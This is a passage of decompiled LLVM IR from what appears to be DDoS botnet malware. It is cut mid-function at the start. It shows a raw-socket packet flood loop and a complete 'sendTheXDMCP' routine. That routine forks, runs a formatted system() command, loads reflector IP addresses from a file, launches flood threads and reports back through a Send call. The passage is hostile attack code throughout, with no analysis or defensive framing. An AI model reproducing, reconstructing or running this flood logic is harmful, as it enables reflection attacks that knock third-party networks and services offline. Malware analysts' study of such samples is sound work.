  store i16 %v1_e898, i16* %v4_e898, align 2
  store i32 1, i32* %stack_var_-4156, align 4
  %v2_e8b8 = ptrtoint i32* %stack_var_-4156 to i32
  %v5_e8d8 = call i32 @__GI_setsockopt(i32 %v3_e744, i32 0, i32 3, i32 %v2_e8b8, i32 4)
  %v1_e8e0 = icmp slt i32 %v5_e8d8, 0
  br i1 %v1_e8e0, label %dec_label_pc_e8e8, label %dec_label_pc_e8f0

dec_label_pc_e8e8:                                ; preds = %dec_label_pc_e764
  %v1_e8ec = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_e8f0

dec_label_pc_e8f0:                                ; preds = %dec_label_pc_e764, %dec_label_pc_e8e8
  %v2_e8f4 = call i32 @__GI_time(i32* null)
  %v1_e900 = call i32 @init_rand(i32 %v2_e8f4)
  %v3_e988 = add i32 %v2_e6f8, 4
  %v4_e988 = inttoptr i32 %v3_e988 to i16*
  br label %dec_label_pc_e910

dec_label_pc_e910:                                ; preds = %dec_label_pc_ea10, %dec_label_pc_e8f0
  %stack_var_-28.0 = phi i32 [ %v3_e730, %dec_label_pc_e8f0 ], [ %v3_e950, %dec_label_pc_ea10 ]
  %storemerge5 = phi i32 [ 0, %dec_label_pc_e8f0 ], [ %v1_ea18, %dec_label_pc_ea10 ]
  %v3_e914 = load i16, i16* %v2_e870, align 2
  %v4_e914 = zext i16 %v3_e914 to i32
  %v6_e948 = call i32 @sendto(i32 %v3_e744, i32 %v2_e6f8, i32 %v4_e914, i32 0, i32 %stack_var_-28.0, i32 16)
  %v1_e950 = add i32 %stack_var_-28.0, 532
  %v2_e950 = inttoptr i32 %v1_e950 to i32*
  %v3_e950 = load i32, i32* %v2_e950, align 4
  %v1_e95c = add i32 %v3_e950, 4
  %v2_e95c = inttoptr i32 %v1_e95c to i32*
  %v3_e95c = load i32, i32* %v2_e95c, align 4
  store i32 %v3_e95c, i32* %v3_e85c, align 4
  %v0_e968 = call i32 @rand_cmwc()
  %v1_e974 = call i32 @__GI_htonl(i32 %v0_e968)
  %v1_e988 = trunc i32 %v1_e974 to i16
  store i16 %v1_e988, i16* %v4_e988, align 4
  %v3_e99c = load i16, i16* %v2_e870, align 2
  %div34 = udiv i16 %v3_e99c, 2
  %v3_e9a0 = zext i16 %div34 to i32
  %v3_e9b4 = call i32 @csum(i16* %v2_e888, i32 %v3_e9a0)
  %v1_e9c4 = trunc i32 %v3_e9b4 to i16
  store i16 %v1_e9c4, i16* %v4_e898, align 2
  %v2_e9cc = load i32, i32* @global_var_526bc.176, align 4
  %v1_e9d0 = add i32 %v2_e9cc, 1
  store i32 %v1_e9d0, i32* @global_var_526bc.176, align 4
  %v2_e9e0 = load i32, i32* @global_var_52590.178, align 4
  %tmp = icmp ugt i32 %v2_e9e0, %storemerge5
  br i1 %tmp, label %dec_label_pc_ea10, label %dec_label_pc_e9f4

dec_label_pc_e9f4:                                ; preds = %dec_label_pc_e910
  %v2_ea04 = load i32, i32* @global_var_4535c.180, align 4
  %v1_ea0c = call i32 @usleep(i32 %v2_ea04)
  br label %dec_label_pc_ea10

dec_label_pc_ea10:                                ; preds = %dec_label_pc_e910, %dec_label_pc_e9f4
  %stack_var_-4168.0 = phi i32 [ %storemerge5, %dec_label_pc_e910 ], [ 0, %dec_label_pc_e9f4 ]
  %v1_ea18 = add i32 %stack_var_-4168.0, 1
  br label %dec_label_pc_e910

; uselistorder directives
  uselistorder i32 %v3_e950, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_e7a4, { 1, 0 }
  uselistorder i32 %v2_e6f8, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4156, { 1, 0 }
  uselistorder label %dec_label_pc_ea10, { 1, 0 }
  uselistorder label %dec_label_pc_e8f0, { 1, 0 }
  uselistorder label %dec_label_pc_e764, { 1, 0 }
}

define i32 @sendTheXDMCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-1112 = alloca i32, align 4
  %stack_var_-1176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 59968, i32* %stack_var_-4, align 4
  %v2_ea3c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ea3c, i32* @fp, align 4
  %v2_ea44 = ptrtoint i32* %stack_var_-1176 to i32
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v1_ea64 = call i32 @mfork(i32 %arg2)
  store i32 %v1_ea64, i32* %r3.global-to-local, align 4
  %v2_ea6c = icmp eq i32 %v1_ea64, 0
  br i1 %v2_ea6c, label %dec_label_pc_ea74, label %dec_label_pc_f118

dec_label_pc_ea74:                                ; preds = %entry
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 255, i32* %r2.global-to-local, align 4
  %v3_ea80 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_ea80, i32* %r3.global-to-local, align 4
  %v1_ea90 = icmp slt i32 %v3_ea80, 0
  br i1 %v1_ea90, label %dec_label_pc_ea98, label %dec_label_pc_eaa0

dec_label_pc_ea98:                                ; preds = %dec_label_pc_ea74
  %v1_ea9c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_eaa0

dec_label_pc_eaa0:                                ; preds = %dec_label_pc_ea74, %dec_label_pc_ea98
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v8_eaa8 = icmp sgt i32 %arg3, 5
  br i1 %v8_eaa8, label %dec_label_pc_eac4, label %dec_label_pc_eaac

dec_label_pc_eaac:                                ; preds = %dec_label_pc_eaa0
  store i32 ptrtoint ([114 x i8]* @global_var_376dc.402 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_eab8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([114 x i8]* @global_var_376dc.402 to i32))
  %v1_eac0 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_eac4

dec_label_pc_eac4:                                ; preds = %dec_label_pc_eaa0, %dec_label_pc_eaac
  %v2_eac8 = call i32 @__GI_time(i32* null)
  %v1_ead8 = add i32 %arg4, 24
  store i32 %v1_ead8, i32* %r3.global-to-local, align 4
  %v1_eadc = inttoptr i32 %v1_ead8 to i32*
  %v2_eadc = load i32, i32* %v1_eadc, align 4
  %v1_eae8 = add i32 %arg4, 12
  store i32 %v1_eae8, i32* %r3.global-to-local, align 4
  %v1_eaec = inttoptr i32 %v1_eae8 to i32*
  %v2_eaec = load i32, i32* %v1_eaec, align 4
  store i32 %v2_eaec, i32* %r3.global-to-local, align 4
  %v1_eaf0 = inttoptr i32 %v2_eaec to i8*
  %v3_eaf4 = call i32 @strlen(i8* %v1_eaf0)
  %v2_eb04 = mul i32 %v3_eaf4, 5
  %v1_eb08 = add i32 %v2_eb04, 160
  store i32 %v1_eb08, i32* %r2.global-to-local, align 4
  store i32 1023, i32* %r3.global-to-local, align 4
  %v8_eb20 = icmp sgt i32 %v1_eb08, 1023
  br i1 %v8_eb20, label %dec_label_pc_f118, label %dec_label_pc_eb24

dec_label_pc_eb24:                                ; preds = %dec_label_pc_eac4
  store i32 %v1_eae8, i32* %r3.global-to-local, align 4
  %v2_eb30 = load i32, i32* %v1_eaec, align 4
  store i32 %v2_eb30, i32* @lr, align 4
  store i32 %v1_eae8, i32* %r3.global-to-local, align 4
  %v2_eb3c = load i32, i32* %v1_eaec, align 4
  store i32 %v2_eb3c, i32* @r4, align 4
  store i32 %v1_eae8, i32* %r3.global-to-local, align 4
  %v2_eb48 = load i32, i32* %v1_eaec, align 4
  store i32 %v2_eb48, i32* %r1.global-to-local, align 4
  store i32 %v1_eae8, i32* %r3.global-to-local, align 4
  %v2_eb54 = load i32, i32* %v1_eaec, align 4
  %v2_eb68 = ptrtoint i32* %stack_var_-1112 to i32
  store i32 %v2_eb3c, i32* %stack_var_-1176, align 4
  store i32 %v2_eb68, i32* @r0, align 4
  store i32 %v1_eb08, i32* @r1, align 4
  store i32 ptrtoint ([166 x i8]* @global_var_37750.404 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_eb30, i32* %r3.global-to-local, align 4
  %v8_eb8c = call i32 @__GI_snprintf(i32 %v2_eb68, i32 %v1_eb08, i32 ptrtoint ([166 x i8]* @global_var_37750.404 to i32), i32 %v2_eb30, i32 %v2_eb3c, i32 %v2_eb48, i32 %v2_eb54)
  store i32 %v2_eb68, i32* %r3.global-to-local, align 4
  %v1_eb9c = call i32 @system(i32 %v2_eb68)
  %v2_eba4 = call i32 @__GI_time(i32* null)
  store i32 %v2_eba4, i32* %r3.global-to-local, align 4
  %v1_ebb0 = call i32 @srand(i32 %v2_eba4)
  store i32 ptrtoint (i32* @global_var_536c4.157 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_536c4.157, align 4
  store i32 128, i32* %r3.global-to-local, align 4
  %v1_ebd8 = call i32 @malloc(i32 128)
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v1_ebd8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_ebf4 = call i32 @__GI_memset()
  %v1_ec04 = add i32 %arg4, 16
  store i32 %v1_ec04, i32* %r3.global-to-local, align 4
  %v1_ec08 = inttoptr i32 %v1_ec04 to i32*
  %v2_ec08 = load i32, i32* %v1_ec08, align 4
  store i32 %v2_ec08, i32* %r3.global-to-local, align 4
  store i32 %v2_ec08, i32* @r0, align 4
  %v1_ec10 = call i32 @atol(i32 %v2_ec08)
  %v1_ec20 = add i32 %arg4, 20
  store i32 %v1_ec20, i32* %r3.global-to-local, align 4
  %v1_ec24 = inttoptr i32 %v1_ec20 to i32*
  %v2_ec24 = load i32, i32* %v1_ec24, align 4
  store i32 %v2_ec24, i32* %r3.global-to-local, align 4
  store i32 %v2_ec24, i32* @r0, align 4
  %v1_ec2c = call i32 @atol(i32 %v2_ec24)
  store i32 0, i32* @global_var_52590.178, align 4
  store i32 ptrtoint (i32* @global_var_526bc.176 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_526bc.176, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_377f8.409 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32), i32* @r1, align 4
  %v3_ec60 = call i32 @__GI_fopen(i32 ptrtoint ([7 x i8]* @global_var_377f8.409 to i32), i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32))
  store i32 %v3_ec60, i32* %r3.global-to-local, align 4
  %v1_ec74 = add i32 %v0_ebf4, -1
  %v4_ec78 = inttoptr i32 %v0_ebf4 to i8*
  br label %dec_label_pc_edcc.outer

dec_label_pc_ec70:                                ; preds = %dec_label_pc_edcc
  store i32 %v0_ebf4, i32* %r3.global-to-local, align 4
  %v3_ec7c = call i32 @strlen(i8* %v4_ec78)
  %v2_ec84 = add i32 %v1_ec74, %v3_ec7c
  store i32 %v2_ec84, i32* %r3.global-to-local, align 4
  %v1_ec88 = inttoptr i32 %v2_ec84 to i8*
  %v2_ec88 = load i8, i8* %v1_ec88, align 1
  %v3_ec88 = zext i8 %v2_ec88 to i32
  store i32 %v3_ec88, i32* %r3.global-to-local, align 4
  %v7_ec8c = icmp eq i8 %v2_ec88, 10
  br i1 %v7_ec8c, label %dec_label_pc_ecb8, label %dec_label_pc_ec94

dec_label_pc_ec94:                                ; preds = %dec_label_pc_ec70
  store i32 %v0_ebf4, i32* %r3.global-to-local, align 4
  store i32 %v1_ec74, i32* @r4, align 4
  %v3_eca0 = call i32 @strlen(i8* %v4_ec78)
  %v0_eca8 = load i32, i32* @r4, align 4
  %v2_eca8 = add i32 %v0_eca8, %v3_eca0
  store i32 %v2_eca8, i32* %r3.global-to-local, align 4
  %v1_ecac = inttoptr i32 %v2_eca8 to i8*
  %v2_ecac = load i8, i8* %v1_ecac, align 1
  %v3_ecac = zext i8 %v2_ecac to i32
  store i32 %v3_ecac, i32* %r3.global-to-local, align 4
  %v7_ecb0 = icmp eq i8 %v2_ecac, 13
  br i1 %v7_ecb0, label %dec_label_pc_ecb8, label %dec_label_pc_edcc

dec_label_pc_ecb8:                                ; preds = %dec_label_pc_ec94, %dec_label_pc_ec70
  store i32 %v0_ebf4, i32* %r3.global-to-local, align 4
  store i32 %v1_ec74, i32* @r4, align 4
  %v3_ecc4 = call i32 @strlen(i8* %v4_ec78)
  %v0_eccc = load i32, i32* @r4, align 4
  %v2_eccc = add i32 %v0_eccc, %v3_ecc4
  store i32 %v2_eccc, i32* %r2.global-to-local, align 4
  %v3_ecd4 = inttoptr i32 %v2_eccc to i8*
  store i8 0, i8* %v3_ecd4, align 1
  %v2_ecdc = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_ecdc, i32* %r3.global-to-local, align 4
  %v2_ece0 = icmp eq i32 %v2_ecdc, 0
  %v1_ecec = call i32 @malloc(i32 540)
  store i32 %v1_ecec, i32* %r3.global-to-local, align 4
  br i1 %v2_ece0, label %dec_label_pc_ece8, label %dec_label_pc_ed58

dec_label_pc_ece8:                                ; preds = %dec_label_pc_ecb8
  store i32 %v1_ecec, i32* %r2.global-to-local, align 4
  store i32 %v1_ecec, i32* @global_var_536c4.157, align 4
  store i32 %v1_ecec, i32* %r3.global-to-local, align 4
  store i32 %v1_ecec, i32* @r0, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_ed10 = call i32 @bzero(i32 %v1_ecec, i32 16)
  store i32 ptrtoint (i32* @global_var_536c4.157 to i32), i32* %r3.global-to-local, align 4
  %v2_ed18 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_ed18, i32* @r4, align 4
  store i32 %v0_ebf4, i32* @r0, align 4
  %v1_ed20 = call i32 @inet_addr(i32 %v0_ebf4)
  %v1_ed28 = load i32, i32* @r4, align 4
  %v2_ed28 = add i32 %v1_ed28, 4
  %v3_ed28 = inttoptr i32 %v2_ed28 to i32*
  store i32 %v1_ed20, i32* %v3_ed28, align 4
  %v2_ed30 = load i32, i32* @global_var_536c4.157, align 4
  %v2_ed3c = add i32 %v2_ed30, 532
  %v3_ed3c = inttoptr i32 %v2_ed3c to i32*
  store i32 %v2_ed30, i32* %v3_ed3c, align 4
  %v2_ed44 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_ed44, i32* %r2.global-to-local, align 4
  store i32 %v2_ed44, i32* %r3.global-to-local, align 4
  %v2_ed50 = add i32 %v2_ed44, 536
  %v3_ed50 = inttoptr i32 %v2_ed50 to i32*
  store i32 %v2_ed44, i32* %v3_ed50, align 4
  br label %dec_label_pc_edc0

dec_label_pc_ed58:                                ; preds = %dec_label_pc_ecb8
  store i32 %v1_ecec, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 540, i32* @r2, align 4
  %v0_ed74 = call i32 @__GI_memset()
  store i32 %v0_ebf4, i32* @r0, align 4
  %v1_ed7c = call i32 @inet_addr(i32 %v0_ebf4)
  %v2_ed88 = add i32 %v1_ecec, 4
  %v3_ed88 = inttoptr i32 %v2_ed88 to i32*
  store i32 %v1_ed7c, i32* %v3_ed88, align 4
  %v2_ed90 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_ed90, i32* %r2.global-to-local, align 4
  %v2_ed98 = add i32 %v1_ecec, 536
  %v3_ed98 = inttoptr i32 %v2_ed98 to i32*
  store i32 %v2_ed90, i32* %v3_ed98, align 4
  %v2_eda0 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_eda0, i32* %r3.global-to-local, align 4
  %v1_eda4 = add i32 %v2_eda0, 532
  %v2_eda4 = inttoptr i32 %v1_eda4 to i32*
  %v3_eda4 = load i32, i32* %v2_eda4, align 4
  %v2_edac = add i32 %v1_ecec, 532
  %v3_edac = inttoptr i32 %v2_edac to i32*
  store i32 %v3_eda4, i32* %v3_edac, align 4
  %v2_edb4 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_edb4, i32* %r2.global-to-local, align 4
  store i32 %v1_ecec, i32* %r3.global-to-local, align 4
  %v2_edbc = add i32 %v2_edb4, 532
  %v3_edbc = inttoptr i32 %v2_edbc to i32*
  store i32 %v1_ecec, i32* %v3_edbc, align 4
  br label %dec_label_pc_edc0

dec_label_pc_edc0:                                ; preds = %dec_label_pc_ece8, %dec_label_pc_ed58
  %v1_edc4 = add i32 %stack_var_-60.0.ph, 1
  store i32 %v1_edc4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_edcc.outer

dec_label_pc_edcc.outer:                          ; preds = %dec_label_pc_edc0, %dec_label_pc_eb24
  %stack_var_-60.0.ph = phi i32 [ %v1_edc4, %dec_label_pc_edc0 ], [ 0, %dec_label_pc_eb24 ]
  br label %dec_label_pc_edcc

dec_label_pc_edcc:                                ; preds = %dec_label_pc_edcc.outer, %dec_label_pc_ec94
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v3_ec60, i32* %r2.global-to-local, align 4
  %v3_edd8 = call i32 @fgets(i32 %v0_ebf4, i32 128, i32 %v3_ec60)
  store i32 %v3_edd8, i32* %r3.global-to-local, align 4
  %v2_ede0 = icmp eq i32 %v3_edd8, 0
  br i1 %v2_ede0, label %dec_label_pc_ede8, label %dec_label_pc_ec70

dec_label_pc_ede8:                                ; preds = %dec_label_pc_edcc
  %v2_edec = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_edec, i32* %r3.global-to-local, align 4
  %v1_edf0 = add i32 %v2_edec, 532
  %v2_edf0 = inttoptr i32 %v1_edf0 to i32*
  %v3_edf0 = load i32, i32* %v2_edf0, align 4
  %v3_edfc = mul i32 %v1_ec10, 4
  %v1_ee04 = add i32 %v3_edfc, 14
  %v3_ee08 = and i32 %v1_ee04, -8
  %v1_ee10 = load i32, i32* @sp, align 4
  %v2_ee10 = sub i32 %v1_ee10, %v3_ee08
  %v1_ee20 = add i32 %v2_ee10, 23
  %v3_ee24 = and i32 %v1_ee20, -8
  store i32 2, i32* %r2.global-to-local, align 4
  %v2_ee44 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_ee44, i32* %r1.global-to-local, align 4
  %v4_ee48 = add i32 %v2_ee44, -1104
  %v5_ee48 = inttoptr i32 %v4_ee48 to i16*
  store i16 2, i16* %v5_ee48, align 4
  %v1_ee50 = add i32 %arg4, 4
  store i32 %v1_ee50, i32* %r3.global-to-local, align 4
  %v1_ee54 = inttoptr i32 %v1_ee50 to i32*
  %v2_ee54 = load i32, i32* %v1_ee54, align 4
  store i32 %v2_ee54, i32* %r3.global-to-local, align 4
  store i32 %v2_ee54, i32* @r0, align 4
  %v1_ee5c = call i32 @inet_addr(i32 %v2_ee54)
  %v2_ee74 = mul i32 %v1_ec10, 24
  %v1_ee78 = or i32 %v2_ee74, 7
  %v1_ee7c = add i32 %v1_ee78, 7
  %v3_ee80 = and i32 %v1_ee7c, -8
  %v1_ee88 = load i32, i32* @sp, align 4
  %v2_ee88 = sub i32 %v1_ee88, %v3_ee80
  %v1_ee8c = add i32 %v2_ee88, 16
  store i32 %v1_ee8c, i32* %r1.global-to-local, align 4
  %v1_ee98 = add i32 %v2_ee88, 23
  %v3_ee9c = and i32 %v1_ee98, -8
  %v2_eef4 = add i32 %v3_ee9c, 8
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v1_ec10, i32* %r3.global-to-local, align 4
  %v5_ef8849 = icmp sgt i32 %v1_ec10, 0
  br i1 %v5_ef8849, label %dec_label_pc_eebc, label %dec_label_pc_ef8c

dec_label_pc_eebc:                                ; preds = %dec_label_pc_ede8, %dec_label_pc_eebc
  %storemerge150 = phi i32 [ %v1_ef74, %dec_label_pc_eebc ], [ 0, %dec_label_pc_ede8 ]
  %v2_eecc = mul i32 %storemerge150, 24
  %v2_eed0 = add i32 %v2_eecc, %v3_ee9c
  %v2_eed8 = inttoptr i32 %v2_eed0 to i32*
  store i32 %storemerge150, i32* %v2_eed8, align 8
  %v2_eef8 = add i32 %v2_eef4, %v2_eecc
  store i32 %v1_ee5c, i32* %r1.global-to-local, align 4
  %v1_ef0c = inttoptr i32 %v2_eef8 to i32*
  %v3_ef0c = or i32 %v2_eef8, 4
  %v4_ef0c = inttoptr i32 %v3_ef0c to i32*
  %v5_ef0c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_ef0c, i32* %v4_ef0c, align 4
  %v6_ef0c = add i32 %v2_eef8, 8
  %v7_ef0c = inttoptr i32 %v6_ef0c to i32*
  %v8_ef0c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_ef0c, i32* %v7_ef0c, align 8
  %v9_ef0c = add i32 %v2_eef8, 12
  %v10_ef0c = inttoptr i32 %v9_ef0c to i32*
  %v11_ef0c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_ef0c, i32* %v10_ef0c, align 4
  %v2_ef2c = or i32 %v2_eed0, 4
  %v2_ef34 = inttoptr i32 %v2_ef2c to i32*
  store i32 %v3_edf0, i32* %v2_ef34, align 4
  %v3_ef40 = mul i32 %storemerge150, 4
  %v2_ef44 = add i32 %v3_ef40, %v3_ee24
  store i32 %v2_eed0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_e6b8.412 to i32), i32* %r2.global-to-local, align 4
  %v4_ef6c = inttoptr i32 %v2_ef44 to i32*
  %v5_ef6c = call i32 @pthread_create(i32* %v4_ef6c, i32 0, i32 ptrtoint (i32* @global_var_e6b8.412 to i32), i32 %v2_eed0)
  %v1_ef74 = add nuw nsw i32 %storemerge150, 1
  store i32 %v1_ef74, i32* %r2.global-to-local, align 4
  store i32 %v1_ec10, i32* %r3.global-to-local, align 4
  %v5_ef88 = icmp slt i32 %v1_ef74, %v1_ec10
  br i1 %v5_ef88, label %dec_label_pc_eebc, label %dec_label_pc_ef8c

dec_label_pc_ef8c:                                ; preds = %dec_label_pc_eebc, %dec_label_pc_ede8
  store i32 %v1_ee50, i32* %r3.global-to-local, align 4
  %v2_ef94 = load i32, i32* %v1_ee54, align 4
  store i32 %v2_ef94, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([32 x i8]* @global_var_37800.414 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_efa4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_37800.414 to i32))
  store i32 %v1_ead8, i32* %r3.global-to-local, align 4
  %v2_efb8 = load i32, i32* %v1_eadc, align 4
  store i32 %v2_efb8, i32* %r3.global-to-local, align 4
  store i32 %v2_efb8, i32* @r0, align 4
  %v1_efc0 = call i32 @atol(i32 %v2_efb8)
  %v2_efcc = mul i32 %v1_efc0, 20
  store i32 %v2_efcc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_efd8 = icmp sgt i32 %v2_efcc, 0
  br i1 %v7_efd8, label %dec_label_pc_efdc, label %dec_label_pc_f110

dec_label_pc_efdc:                                ; preds = %dec_label_pc_ef8c
  store i32 50, i32* %r1.global-to-local, align 4
  store i32 200, i32* %r2.global-to-local, align 4
  store i32 50000, i32* %r3.global-to-local, align 4
  %v1_f00c = call i32 @usleep(i32 50000)
  %v2_f014 = load i32, i32* @global_var_526bc.176, align 4
  %v2_f01c = mul i32 %v2_f014, 20
  store i32 %v2_f01c, i32* %r2.global-to-local, align 4
  %tmp51 = icmp ugt i32 %v2_f01c, %v1_ec2c
  %v2_f070 = load i32, i32* @global_var_52590.178, align 4
  store i32 %v2_f070, i32* %r3.global-to-local, align 4
  br i1 %tmp51, label %dec_label_pc_f02c, label %dec_label_pc_f06c

dec_label_pc_f02c:                                ; preds = %dec_label_pc_efdc
  %v5_f038 = icmp sgt i32 %v2_f070, 0
  br i1 %v5_f038, label %dec_label_pc_f054, label %dec_label_pc_f03c

dec_label_pc_f03c:                                ; preds = %dec_label_pc_f02c
  %v2_f040 = load i32, i32* @global_var_4535c.180, align 4
  %v1_f044 = add i32 %v2_f040, 100
  store i32 %v1_f044, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_f044, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_f0b4

dec_label_pc_f054:                                ; preds = %dec_label_pc_f02c
  %v1_f05c = add i32 %v2_f070, -1
  store i32 %v1_f05c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_52590.178 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_f05c, i32* @global_var_52590.178, align 4
  br label %dec_label_pc_f0b4

dec_label_pc_f06c:                                ; preds = %dec_label_pc_efdc
  %v1_f074 = add i32 %v2_f070, 1
  store i32 %v1_f074, i32* %r2.global-to-local, align 4
  store i32 %v1_f074, i32* @global_var_52590.178, align 4
  %v2_f084 = load i32, i32* @global_var_4535c.180, align 4
  store i32 %v2_f084, i32* %r3.global-to-local, align 4
  %v1_f088 = add i32 %v2_f084, -25
  %tmp52 = icmp ult i32 %v2_f084, 26
  br i1 %tmp52, label %dec_label_pc_f0a8, label %dec_label_pc_f090

dec_label_pc_f090:                                ; preds = %dec_label_pc_f06c
  store i32 %v1_f088, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_f088, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_f0b4

dec_label_pc_f0a8:                                ; preds = %dec_label_pc_f06c
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_f0b4

dec_label_pc_f0b4:                                ; preds = %dec_label_pc_f090, %dec_label_pc_f054, %dec_label_pc_f03c, %dec_label_pc_f0a8
  store i32 ptrtoint (i32* @global_var_526bc.176 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_526bc.176, align 4
  %v2_f0e4 = add i32 %v2_eadc, %v2_eac8
  br label %dec_label_pc_f0c0

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_f100, %dec_label_pc_f0b4
  %stack_var_-68.0 = phi i32 [ %tmp, %dec_label_pc_f0b4 ], [ %v1_f104, %dec_label_pc_f100 ]
  store i32 %stack_var_-68.0, i32* %r3.global-to-local, align 4
  %v7_f0c8 = icmp slt i32 %stack_var_-68.0, 100
  br i1 %v7_f0c8, label %dec_label_pc_f100, label %dec_label_pc_f0cc

dec_label_pc_f0cc:                                ; preds = %dec_label_pc_f0c0
  %v2_f0d0 = call i32 @__GI_time(i32* null)
  store i32 %v2_f0d0, i32* %r1.global-to-local, align 4
  store i32 %v2_eac8, i32* %r2.global-to-local, align 4
  store i32 %v2_f0e4, i32* %r3.global-to-local, align 4
  %v3_f0e8 = icmp ult i32 %v2_f0d0, %v2_f0e4
  br i1 %v3_f0e8, label %dec_label_pc_f0f8, label %dec_label_pc_f0f0

dec_label_pc_f0f0:                                ; preds = %dec_label_pc_f0cc
  %v1_f0f4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_f0f8

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_f0cc, %dec_label_pc_f0f0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f100

dec_label_pc_f100:                                ; preds = %dec_label_pc_f0c0, %dec_label_pc_f0f8
  %stack_var_-68.1 = phi i32 [ %stack_var_-68.0, %dec_label_pc_f0c0 ], [ 0, %dec_label_pc_f0f8 ]
  %v1_f104 = add i32 %stack_var_-68.1, 1
  store i32 %v1_f104, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f0c0

dec_label_pc_f110:                                ; preds = %dec_label_pc_ef8c
  %v1_f114 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_f118

dec_label_pc_f118:                                ; preds = %entry, %dec_label_pc_eac4, %dec_label_pc_f110
  %v1_f124 = phi i32 [ %v1_ea64, %entry ], [ %v3_eaf4, %dec_label_pc_eac4 ], [ %v1_f114, %dec_label_pc_f110 ]
  ret i32 %v1_f124

; uselistorder directives
  uselistorder i32 %v1_f104, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 0, 2, 1 }
  uselistorder i32 %v1_f088, { 1, 0 }
  uselistorder i32 %v2_f070, { 2, 0, 1, 3 }
  uselistorder i32 %v1_ef74, { 2, 1, 0 }
  uselistorder i32 %v2_eef8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_eed0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_eecc, { 1, 0 }
  uselistorder i32 %storemerge150, { 3, 0, 2, 1 }
  uselistorder i32 %v2_ed44, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ed30, { 1, 0 }
  uselistorder i32 %v1_ecec, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %v1_ec74, { 1, 2, 0 }
  uselistorder i32 %v3_ec60, { 1, 0, 2 }
  uselistorder i32 %v1_ec10, { 4, 3, 0, 1, 5, 2 }
  uselistorder i32 %v0_ebf4, { 9, 2, 1, 4, 3, 5, 0, 6, 8, 7 }
